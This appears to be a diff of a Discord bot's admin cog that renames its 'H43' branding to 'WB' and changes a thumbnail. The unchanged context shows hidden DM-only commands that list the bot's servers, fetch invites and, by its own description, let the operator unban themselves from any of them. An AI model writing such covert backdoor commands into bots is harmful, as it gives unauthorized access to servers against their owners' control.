@@ -10,7 +10,7 @@ class Admin_ext(commands.Cog):
     def cog_check(self, ctx):
         return isinstance(ctx.channel, discord.DMChannel)
 
-    @commands.command(brief='H43?invites [page\'s number]\nInvite (uses another person invite) and unban yourself from servers bot is in')
+    @commands.command(brief='WB?invites [page\'s number]\nInvite (uses another person invite) and unban yourself from servers bot is in')
     async def invites(self, ctx, page=0):
         enum_guilds = {}
         guilds = self.client.guilds
@@ -18,10 +18,10 @@ class Admin_ext(commands.Cog):
         if len(guilds) < page*10:
             return await ctx.author.send('```Invalid page```')
 
-        embed = discord.Embed(title='**H43**', description='Server\'s list',
+        embed = discord.Embed(title='**WB**', description='Server\'s list',
                               colour=discord.Colour.blurple())
         embed.set_thumbnail(
-            url='https://avatars1.githubusercontent.com/u/25065248?s=400&u=cfb97be8f4eef00e3f11ed883cd8b2b5f98d1ed9&v=4')
+            url='https://cdn.discordapp.com/avatars/1093235684904534028/f8ac32b916951c690604685b8aa3e512.webp?size=4096')
 
         for idx, guild in enumerate(guilds[page*10: page*10 + 10]):
             enum_guilds[idx] = guild
@@ -71,7 +71,7 @@ class Admin_ext(commands.Cog):
                     break
             await ctx.author.send(f'{guild.name} ==> {invite}')
 
-    @commands.command(brief='H43?logout\nStop script')
+    @commands.command(brief='WB?logout\nStop script')
     async def logout(self, ctx):
         await ctx.send('Logging out bot!')
         print('Logging Out Bot!')
@@ -80,3 +80,4 @@ class Admin_ext(commands.Cog):
 
 def setup(client):
     client.add_cog(Admin_ext(client))
+
